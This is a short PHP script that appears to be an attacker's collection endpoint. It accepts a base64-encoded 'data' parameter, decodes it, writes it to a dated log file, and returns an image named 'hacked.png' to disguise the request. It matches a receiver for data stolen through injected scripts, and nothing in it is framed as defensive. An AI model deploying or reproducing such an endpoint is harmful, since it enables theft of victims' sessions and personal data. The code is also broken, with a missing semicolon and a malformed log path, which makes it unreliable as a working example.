<?php
$logFile = __DIR__ . date('Y-m-d') . '.log'
$flower  = __DIR__ . '/images/hacked.png';
if ($_REQUEST['data']) {
    file_put_contents($logFile, base64_decode($_REQUEST['data']));
}
readfile($flower);
